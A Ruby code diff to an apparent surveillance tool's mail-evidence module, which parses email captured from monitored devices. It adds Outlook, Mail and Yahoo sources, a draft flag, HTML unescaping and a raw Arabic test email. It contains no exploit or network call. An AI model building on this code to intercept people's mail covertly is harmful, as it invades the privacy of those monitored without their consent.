@@ -2,6 +2,7 @@
 
 require 'rcs-common/evidence/common'
 require 'mail'
+require 'cgi'
 
 module RCS
 module MailEvidence
@@ -10,16 +11,51 @@ module MailEvidence
   MAIL_VERSION2 = 2012030601
 
   MAIL_INCOMING = 0x00000010
+  MAIL_DRAFT = 0x00000100
 
   PROGRAM_GMAIL = 0x00000000
   PROGRAM_BB = 0x00000001
   PROGRAM_ANDROID = 0x00000002
   PROGRAM_THUNDERBIRD = 0x00000003
+  PROGRAM_OUTLOOK = 0x00000004
+  PROGRAM_MAIL = 0x00000005
+  PROGRAM_YAHOO = 0x00000006
 
   ADDRESSES = ['ciccio.pasticcio@google.com', 'billg@microsoft.com', 'john.doe@nasa.gov', 'mario.rossi@italy.it']
   SUBJECTS = ['drugs', 'bust me!', 'police here']
   BODIES = ["You're busted, dude.", "I'm a drug trafficker, send me to hang!", "I'll sell meth to kids. Stop me."]
-  
+
+ARABIC = <<-EOF
+
+MIME-Version: 1.0
+Received: by 10.64.33.143 with HTTP; Mon, 1 Jul 2013 03:11:15 -0700 (PDT)
+Date: Mon, 1 Jul 2013 12:11:15 +0200
+Delivered-To: jimmypage1337@gmail.com
+Message-ID: <CALdP1Uy44nQ-1Pfj1Po+uoUKbe5JMGDr-ZhpoHRVVkNQdOOV5w@mail.gmail.com>
+Subject: Test
+From: Jimmy Page <jimmypage1337@gmail.com>
+To: Jimmy Page <jimmypage1337@gmail.com>
+Content-Type: multipart/alternative; boundary=14dae947395bec30d304e0707250
+
+--14dae947395bec30d304e0707250
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: base64
+
+2KrYtNi02LPZitiq2YXZhiDYqtmG2LTYp9iz2YbZiiDZh9i52LTYutiz2Yog2KfYqti02LPZitin
+INmG2KrYtNiz2KfZitivDQrYtNiz2YXYqtmK2YYg2LTYs9mK2KrZhiDYtNmH2KTYudiz2YrZhNix
+2YbYqg0K2LHYs9ix2LPZitix2YrYsw0K
+--14dae947395bec30d304e0707250
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: base64
+
+PGRpdiBkaXI9Imx0ciI+PGRpdiBkaXI9InJ0bCI+2KrYtNi02LPZitiq2YXZhiDYqtmG2LTYp9iz
+2YbZiiDZh9i52LTYutiz2Yog2KfYqti02LPZitinINmG2KrYtNiz2KfZitivPGJyPjwvZGl2Pjxk
+aXYgZGlyPSJydGwiPti02LPZhdiq2YrZhiDYtNiz2YrYqtmGINi02YfYpNi52LPZitmE2LHZhtiq
+IDxicj7Ysdiz2LHYs9mK2LHZitizPGJyPjwvZGl2PjwvZGl2Pg0K
+--14dae947395bec30d304e0707250--
+EOF
+
+
   def content
     @email.to_s
   end
@@ -37,6 +73,8 @@ module MailEvidence
       subject SUBJECTS.sample
       body    BODIES.sample
     end
+
+    #@email = ARABIC
 
     ft_high, ft_low = Time.now.to_filetime
     body = @email.to_s
@@ -73,14 +111,23 @@ module MailEvidence
             ret[:data][:program] = 'android'
           when PROGRAM_THUNDERBIRD
             ret[:data][:program] = 'thunderbird'
+          when PROGRAM_OUTLOOK
+            ret[:data][:program] = 'outlook'
+          when PROGRAM_MAIL
+            ret[:data][:program] = 'mail'
+          when PROGRAM_YAHOO
+            ret[:data][:program] = 'yahoo'
           else
             ret[:data][:program] = 'unknown'
         end
         # direction of the mail
         ret[:data][:incoming] = (flags & MAIL_INCOMING != 0) ? 1 : 0
+        ret[:data][:draft] = true if (flags & MAIL_DRAFT != 0)
       else
         raise EvidenceDeserializeError.new("invalid log version for MAIL")
     end
+
+    #trace :debug, ret[:data].inspect
 
     ret[:data][:size] = size
     return ret
@@ -94,6 +141,10 @@ module MailEvidence
     # this is the raw content of the mail
     # save it as is in the grid
     eml = chunks.join
+
+    # special case for outlook (live) mail that are html encoded
+    eml = CGI.unescapeHTML(eml) if info[:data][:program].eql? 'outlook'
+
     info[:grid_content] = eml
 
     # parse the mail to extract information
@@ -109,7 +160,11 @@ module MailEvidence
     info[:data][:from] = parse_address(m.from)
     info[:data][:rcpt] = parse_address(m.to)
     info[:data][:cc] = parse_address(m.cc)
-    info[:data][:subject] = m.subject.safe_utf8_encode unless m.subject.nil?
+
+    if m.subject
+      info[:data][:subject] = m.subject.dup
+      info[:data][:subject].safe_utf8_encode_invalid
+    end
 
     #trace :debug, "MAIL: multipart #{m.multipart?} parts size: #{m.parts.size}"
     #trace :debug, "MAIL: parts #{m.parts.inspect}"
@@ -129,8 +184,10 @@ module MailEvidence
       info[:data][:body] = body['text/html']
     else
       info[:data][:body] = body['text/plain']
-      info[:data][:body] ||= ''
+      info[:data][:body] ||= 'Content of this mail cannot be decoded.'
     end
+
+    #trace :debug, "MAIL: body: #{info[:data][:body]}"
 
     info[:data][:attach] = m.attachments.length if m.attachments.length > 0
 
@@ -150,12 +207,10 @@ module MailEvidence
     content_types = parts.map { |p| p.content_type.split(';')[0] }
     body = {}
     content_types.each_with_index do |ct, i|
-      case ct
-        when 'multipart/alternative'
-          body = parse_multipart(parts[i].parts)
-        else
-          body ||= {}
-          body[ct] = parts[i].body.decoded.safe_utf8_encode
+      if parts[i].multipart?
+        body = parse_multipart(parts[i].parts)
+      else
+        body[ct] = parts[i].body.decoded.safe_utf8_encode
       end
     end
     body
